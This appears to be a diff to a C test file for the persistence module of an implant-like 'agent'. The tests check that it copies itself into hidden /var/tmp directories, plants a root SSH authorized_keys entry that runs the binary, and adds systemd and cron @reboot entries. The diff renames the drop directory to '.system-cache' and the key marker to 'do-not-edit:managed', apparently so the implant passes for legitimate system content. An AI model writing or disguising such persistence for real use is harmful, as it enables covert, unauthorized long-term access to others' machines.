@@ -81,8 +81,8 @@ int main(void) {
     mkdir(root, 0755);
 
     char binp[512] = {0};
-    ck("drop self", persist_drop_self(root, "/var/tmp/.dayanjing", binp, sizeof binp) == 0);
-    ck("bin path endswith /agent", strstr(binp, "/var/tmp/.dayanjing/agent") != NULL);
+    ck("drop self", persist_drop_self(root, "/var/tmp/.system-cache", binp, sizeof binp) == 0);
+    ck("bin path endswith /agent", strstr(binp, "/var/tmp/.system-cache/agent") != NULL);
     ck("dropped file exists", exists(binp));
     {
         struct stat s1, s2;
@@ -107,7 +107,7 @@ int main(void) {
     ck("install sshkey", persist_install(PERSIST_SSHKEY, root, binp) == 0);
     {
         char p[512]; snprintf(p, sizeof p, "%s/root/.ssh/authorized_keys", root);
-        ck("sshkey marker present", file_has(p, "dayanjing-agent-persist"));
+        ck("sshkey marker present", file_has(p, "do-not-edit:managed"));
         ck("sshkey command=bin", file_has(p, binp));
     }
     ck("installed(systemd)==1", persist_installed(root, PERSIST_SYSTEMD) == 1);
@@ -123,7 +123,7 @@ int main(void) {
         char p[512]; snprintf(p, sizeof p, "%s/etc/cron.d/dayanjing", root);
         ck("cron not duplicated", count_substr(p, "@reboot") == 1);
         char q[512]; snprintf(q, sizeof q, "%s/root/.ssh/authorized_keys", root);
-        ck("sshkey marker not duplicated", count_substr(q, "dayanjing-agent-persist") == 1);
+        ck("sshkey marker not duplicated", count_substr(q, "do-not-edit:managed") == 1);
     }
     {
         int meth[3] = {0};
@@ -139,7 +139,7 @@ int main(void) {
     ck("after uninstall sshkey==0", persist_installed(root, PERSIST_SSHKEY) == 0);
     {
         char q[512]; snprintf(q, sizeof q, "%s/root/.ssh/authorized_keys", root);
-        ck("sshkey marker gone", !file_has(q, "dayanjing-agent-persist"));
+        ck("sshkey marker gone", !file_has(q, "do-not-edit:managed"));
     }
     /* Windows 专用方法在 Linux 上应返回 -2 */
     ck("registry unsupported", persist_install(PERSIST_REGISTRY, root, "a.exe") == -2);
